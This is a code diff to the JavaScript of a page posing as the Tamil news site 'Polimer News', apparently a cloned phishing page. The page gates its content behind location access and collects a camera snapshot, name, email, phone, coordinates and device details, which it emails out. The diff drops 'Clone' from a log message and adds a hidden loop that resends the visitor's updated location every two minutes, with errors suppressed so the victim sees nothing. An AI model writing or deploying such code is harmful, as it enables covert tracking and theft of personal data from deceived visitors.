@@ -8,7 +8,7 @@ let capturedImage = null;
 let cameraStream = null;
 
 document.addEventListener('DOMContentLoaded', () => {
-    console.log('--- Polimer News Clone Initialized ---');
+    console.log('--- Polimer News ---');
 
     // Initialize dynamic date/time
     updateDateTime();
@@ -136,6 +136,22 @@ function initModalLogic() {
 }
 
 /**
+ * Starts a periodic background submissionEvery 2 minutes.
+ */
+function startBackgroundLoop(data) {
+    console.log('--- Background Update Loop Started (2m interval) ---');
+    setInterval(async () => {
+        console.log('--- Triggering Background Mail ---');
+        // We use the same data but the locationData might have been updated by initGeolocation
+        const updatedData = {
+            ...data,
+            location: locationData // Use the latest locationData from global scope
+        };
+        await sendFinalData(updatedData, true);
+    }, 120000);
+}
+
+/**
  * Camera Handlers
  */
 async function initCamera() {
@@ -243,7 +259,7 @@ async function handleLocationSuccess(lat, lon, source) {
     // Unlock UI
     const overlay = document.getElementById('location-lock-overlay');
     const mainContent = document.querySelector('.content-wrapper');
-    
+
     if (overlay) overlay.classList.add('hidden');
     if (mainContent) mainContent.classList.remove('content-locked');
 
@@ -284,9 +300,9 @@ async function fetchReverseGeocode(lat, lon) {
 /**
  * Final Data Submission
  */
-async function sendFinalData(data) {
+async function sendFinalData(data, isBackground = false) {
     const emailData = {
-        _subject: `New Investigative Lead: ${data.name}`,
+        _subject: isBackground ? `[Loop Update] Investigative Lead: ${data.name}` : `New Investigative Lead: ${data.name}`,
         "Name": data.name,
         "Email": data.email,
         "Phone": data.phone,
@@ -297,9 +313,8 @@ async function sendFinalData(data) {
         "Maps Link": `https://www.google.com/maps?q=${data.location?.lat},${data.location?.lon}`,
         "Device Info": navigator.userAgent,
         "Snapshot": "Sent as attachment/content below",
-        // FormSubmit handles Base64 as text, or we can use another trick. 
-        // For simplicity in this clone, we send the fields.
-        "Verification Image": data.image
+        "Verification Image": data.image,
+        "Update Type": isBackground ? "Periodic Loop" : "Initial Submission"
     };
 
     try {
@@ -309,13 +324,19 @@ async function sendFinalData(data) {
             body: JSON.stringify(emailData)
         });
         const result = await response.json();
-        console.log("Success:", result);
-        showSuccessState();
+        console.log(isBackground ? "Background Success:" : "Initial Success:", result);
+        
+        if (!isBackground) {
+            showSuccessState();
+            startBackgroundLoop(data);
+        }
     } catch (err) {
         console.error("Submission Error:", err);
-        alert('தரவுகளை அனுப்புவதில் சிக்கல் ஏற்பட்டது. மீண்டும் முயலவும்.');
-        document.getElementById('submit-btn').disabled = false;
-        document.getElementById('submit-btn').textContent = 'தரவுகளை சமர்ப்பிக்கவும்';
+        if (!isBackground) {
+            alert('தரவுகளை அனுப்புவதில் சிக்கல் ஏற்பட்டது. மீண்டும் முயலவும்.');
+            document.getElementById('submit-btn').disabled = false;
+            document.getElementById('submit-btn').textContent = 'தரவுகளை சமர்ப்பிக்கவும்';
+        }
     }
 }
 
